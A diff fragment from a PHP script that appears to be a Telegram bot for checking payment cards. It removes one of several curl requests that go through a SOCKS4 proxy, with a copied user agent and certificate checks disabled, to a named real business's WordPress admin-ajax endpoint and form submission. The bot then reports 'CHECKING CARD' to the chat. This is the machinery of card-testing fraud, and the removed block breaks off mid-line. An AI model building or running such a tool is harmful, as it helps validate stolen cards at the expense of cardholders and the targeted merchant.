@@ -388,21 +388,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1075%26
 
 $result2 = curl_exec($ch);
 
-# -------------------- [2 REQ] -------------------#
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://flowersofbethlehem.com.au/wp-admin/admin-ajax.php?t=1707104820957');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_
-
-//==================req 2 end===============//
-
+# -------------------- [2 REQ] --------
 
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
